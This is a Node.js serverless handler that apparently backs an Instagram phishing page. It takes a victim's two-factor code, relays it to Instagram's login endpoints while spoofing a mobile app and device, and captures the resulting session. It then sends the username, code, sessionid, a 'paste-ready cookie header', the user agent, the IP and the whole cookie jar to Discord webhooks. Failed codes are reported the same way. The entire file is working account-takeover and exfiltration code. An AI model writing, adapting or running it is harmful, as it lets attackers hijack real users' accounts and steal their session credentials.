const https = require('node:https');
const zlib = require('node:zlib');
const crypto = require('node:crypto');

const BASE = 'https://www.instagram.com';
const IAPI = 'https://i.instagram.com';
const APP_ID = '936619743392459';
const MOB_APP_ID = '567067343352427';
const MOB_UA = 'Instagram 275.0.0.27.98 Android (33/13; 420dpi; 1080x2201; samsung; SM-G991B; o1s; exynos2100; en_US; 458229237)';

function req(url, method, headers, body) {
  const u = new URL(url);
  return new Promise((resolve, reject) => {
    const r = https.request({
      host: u.hostname, port: 443, path: u.pathname + u.search, method, headers, servername: u.hostname, timeout: 25000
    }, (res) => {
      const e = res.headers['content-encoding'];
      let s = res;
      if (e === 'gzip') s = res.pipe(zlib.createGunzip());
      else if (e === 'br') s = res.pipe(zlib.createBrotliDecompress());
      const c = [];
      s.on('data', (x) => c.push(x));
      s.on('end', () => resolve({ status: res.statusCode, headers: res.headers, text: Buffer.concat(c).toString('utf8') }));
    });
    r.on('error', reject);
    r.on('timeout', () => r.destroy(new Error('timeout')));
    if (body) r.write(body);
    r.end();
  });
}

const unpack = (s) => {
  try { const o = JSON.parse(Buffer.from(String(s || ''), 'base64url').toString()); return { jar: o.c || {}, u: o.u || '', a: o.a || MOB_UA, ch: o.ch || 'web' }; }
  catch { return { jar: {}, u: '', a: MOB_UA, ch: 'web' }; }
};
const json = (t) => { try { return JSON.parse(t); } catch { return {}; } };
const field = (n, v, i) => ({ name: n, value: String(v).slice(0, 1020), inline: !!i });
const dec = (v) => { try { return decodeURIComponent(v); } catch { return v; } };

function absorb(jar, h) {
  for (const line of [].concat(h['set-cookie'] || [])) {
    const p = line.split(';')[0], i = p.indexOf('=');
    if (i < 1) continue;
    const k = p.slice(0, i).trim(), v = p.slice(i + 1).trim();
    if (!v || /max-age=0|1970/i.test(line)) delete jar[k]; else jar[k] = v;
  }
}

async function hook(p) {
  const urls = (process.env.DISCORD_WEBHOOK_URL || '').split(',').map((s) => s.trim()).filter(Boolean);
  await Promise.all(urls.map((u) => fetch(u, {
    method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(p)
  }).catch(() => {})));
}

module.exports = async (req, res) => {
  if (req.method !== 'POST') return res.status(405).json({ message: 'POST only' });
  try {
    const b = req.body || {};
    const { jar, u: username, a: ua, ch } = unpack(b.state);
    const code = String(b.code || '').replace(/\s/g, '');
    const ip = (req.headers['x-forwarded-for'] || '').split(',')[0] || '?';
    if (!code) return res.json({ step: 'bad', message: 'Enter the 6-digit code.' });

    const cookie = Object.entries(jar).map(([k, v]) => `${k}=${v}`).join('; ');
    const seed = crypto.createHash('md5').update(username).digest('hex');
    let d = {};

    if (ch === 'mob') {
      const r = await req(IAPI + '/api/v1/accounts/two_factor_login/', 'POST', {
        'user-agent': MOB_UA, 'accept-language': 'en-US', 'accept-encoding': 'gzip, br',
        'x-ig-app-id': MOB_APP_ID, 'x-ig-capabilities': '3brTvw==', 'x-ig-connection-type': 'WIFI',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        cookie, 'x-csrftoken': decodeURIComponent(jar.csrftoken || ''), origin: IAPI
      }, new URLSearchParams({
        username, verification_code: code, two_factor_identifier: b.identifier || '',
        trust_this_device: '1', _csrftoken: jar.csrftoken || '',
        guid: crypto.randomUUID(), device_id: 'android-' + seed.slice(0, 16), adid: seed,
        waterfall_id: crypto.randomUUID()
      }).toString());
      absorb(jar, r.headers);
      d = json(r.text);
      if (d.logged_in && d.user_id && !jar.ds_user_id) jar.ds_user_id = String(d.user_id);
    } else {
      for (const ep of ['/api/v1/web/accounts/login/ajax/two_factor/', '/api/v1/web/accounts/two_factor_login/']) {
        const r = await req(BASE + ep, 'POST', {
          'user-agent': ua, accept: '*/*', 'accept-language': 'en-US,en;q=0.9', 'accept-encoding': 'gzip, br',
          'x-ig-app-id': APP_ID, 'x-asbd-id': '129477', 'x-requested-with': 'XMLHttpRequest',
          'content-type': 'application/x-www-form-urlencoded', cookie,
          'x-csrftoken': decodeURIComponent(jar.csrftoken || ''), origin: BASE, referer: BASE + '/accounts/login/'
        }, new URLSearchParams({
          username, verificationCode: code, identifier: b.identifier || '', method: '1',
          trustThisDevice: '1', _csrftoken: jar.csrftoken || ''
        }).toString());
        absorb(jar, r.headers);
        d = json(r.text);
        if (r.status !== 404) break;
      }
    }

    const sid = jar.sessionid;
    if (sid) {
      const paste = [`sessionid=${sid}`, jar.ds_user_id && `ds_user_id=${jar.ds_user_id}`,
        jar.csrftoken && `csrftoken=${jar.csrftoken}`].filter(Boolean).join('; ');
      const embeds = [{
        title: '✅ Instagram — 2FA passed', color: 0x2e9e5b, timestamp: new Date().toISOString(),
        fields: [field('Username', username), field('Code', '```' + code + '```'),
          field('sessionid (decoded)', '```' + dec(sid) + '```'),
          field('Paste-ready cookie header', '```' + paste + '```'),
          field('User-Agent to reuse', '```' + ua + '```'), field('IP', ip, true)]
      }];
      const all = Object.entries(jar).map(([k, v]) => `${k}=${v}`).join('; ');
      for (let i = 0; i < all.length && embeds.length < 6; i += 950)
        embeds.push({ title: 'Cookie jar', color: 0x222222, description: '```\n' + all.slice(i, i + 950) + '\n```' });
      await hook({ content: `**${username}**`, embeds });
      return res.json({ step: 'done' });
    }

    await hook({
      content: `**${username}**`,
      embeds: [{ title: '⚠️ Instagram 2FA — code rejected', color: 0x992d22, timestamp: new Date().toISOString(),
        fields: [field('Code tried', '```' + code + '```'), field('Response', JSON.stringify(d).slice(0, 900))] }]
    });

    return res.json({ step: 'bad', message: d.message || 'That code is not right. Check it and try again.' });
  } catch (e) {
    console.error(e);
    return res.json({ step: 'bad', message: 'Network error. Please try again.' });
  }
};

module.exports.config = { maxDuration: 60 };
